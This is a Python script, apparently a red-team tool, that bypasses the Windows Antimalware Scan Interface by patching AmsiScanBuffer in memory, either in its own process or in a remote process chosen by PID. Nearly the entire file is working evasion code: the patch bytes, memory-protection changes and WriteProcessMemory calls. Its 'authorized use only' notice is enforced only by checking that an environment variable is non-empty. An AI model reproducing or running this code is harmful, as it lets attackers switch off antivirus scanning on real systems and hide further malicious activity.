#!/usr/bin/env python3
"""
amsi_patch.py - AMSI bypass via AmsiScanBuffer patching
For authorized security research and red team engagements ONLY.

Usage:
    python scripts/amsi_patch.py --mode check
    python scripts/amsi_patch.py --mode patch-self
    python scripts/amsi_patch.py --mode patch --pid <PID>

Engagement proof required: set env var ENGAGEMENT_PROOF=<ref>
"""
import argparse
import ctypes
import os
import sys
from ctypes import wintypes

ENGAGEMENT_PROOF = os.environ.get("ENGAGEMENT_PROOF", "")

# AMSI patch: mov eax, 0x80070057 (E_INVALIDARG); ret
# Forces AmsiScanBuffer to return error -> AV sees no scan result -> bypass
AMSI_PATCH_X64 = bytes([0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3])
AMSI_PATCH_MINIMAL = bytes([0x31, 0xC0, 0xC3])  # xor eax,eax; ret

kernel32 = ctypes.WinDLL("kernel32", use_last_error=True)


def require_engagement_proof():
    if not ENGAGEMENT_PROOF:
        print("[!] ERROR: ENGAGEMENT_PROOF env var not set.")
        print("    Usage: set ENGAGEMENT_PROOF=engagement-ref-123")
        sys.exit(1)
    print(f"[+] Engagement proof: {ENGAGEMENT_PROOF}")


def get_amsiscan_addr():
    """Resolve AmsiScanBuffer address from loaded amsi.dll."""
    try:
        amsi = ctypes.WinDLL("amsi.dll")
    except OSError:
        print("[-] amsi.dll not loaded")
        return None
    hmod = kernel32.GetModuleHandleW("amsi.dll")
    addr = kernel32.GetProcAddress(hmod, b"AmsiScanBuffer")
    return addr


def check_status():
    """Report current bytes at AmsiScanBuffer."""
    addr = get_amsiscan_addr()
    if not addr:
        return
    buf = (ctypes.c_ubyte * 8)()
    read = ctypes.c_size_t(0)
    kernel32.ReadProcessMemory(ctypes.c_void_p(-1), ctypes.c_void_p(addr), buf, 8, ctypes.byref(read))
    current = bytes(buf[:read.value])
    patched = current[:6] == AMSI_PATCH_X64
    print(f"[*] AmsiScanBuffer @ 0x{addr:016X}")
    print(f"[*] Bytes    : {current.hex(' ')}")
    print(f"[*] Status   : {'PATCHED (AMSI bypassed)' if patched else 'ACTIVE (unpatched)'}")


def patch_self():
    """Patch AmsiScanBuffer in the current process."""
    require_engagement_proof()
    addr = get_amsiscan_addr()
    if not addr:
        return False
    old = wintypes.DWORD(0)
    kernel32.VirtualProtect(ctypes.c_void_p(addr), 6, 0x40, ctypes.byref(old))
    ctypes.memmove(ctypes.c_void_p(addr), AMSI_PATCH_X64, 6)
    kernel32.VirtualProtect(ctypes.c_void_p(addr), 6, old, ctypes.byref(old))
    print(f"[+] Self patched AmsiScanBuffer @ 0x{addr:016X}")
    print(f"[+] Bytes written: {AMSI_PATCH_X64.hex(' ')}")
    return True


def patch_remote(pid: int):
    """Patch AmsiScanBuffer in a remote process."""
    require_engagement_proof()
    addr = get_amsiscan_addr()
    if not addr:
        return False
    h = kernel32.OpenProcess(0x1F0FFF, False, pid)
    if not h:
        print(f"[-] OpenProcess failed: {ctypes.get_last_error()}")
        return False
    old = wintypes.DWORD(0)
    kernel32.VirtualProtectEx(h, ctypes.c_void_p(addr), 6, 0x40, ctypes.byref(old))
    written = ctypes.c_size_t(0)
    buf = (ctypes.c_ubyte * 6)(*AMSI_PATCH_X64)
    ok = kernel32.WriteProcessMemory(h, ctypes.c_void_p(addr), buf, 6, ctypes.byref(written))
    kernel32.VirtualProtectEx(h, ctypes.c_void_p(addr), 6, old, ctypes.byref(old))
    kernel32.CloseHandle(h)
    print(f"[+] Remote patch PID={pid} @ 0x{addr:016X}: {'OK' if ok else 'FAILED'}")
    return ok


def main():
    p = argparse.ArgumentParser(description="AMSI patch tool (authorized use only)")
    p.add_argument("--mode", choices=["check", "patch-self", "patch"], required=True)
    p.add_argument("--pid", type=int, help="PID for remote patch")
    args = p.parse_args()
    if sys.platform != "win32":
        print("[-] Windows only"); sys.exit(1)
    if args.mode == "check":
        check_status()
    elif args.mode == "patch-self":
        patch_self()
    elif args.mode == "patch":
        if not args.pid:
            print("[-] --pid required"); sys.exit(1)
        patch_remote(args.pid)


if __name__ == "__main__":
    main()
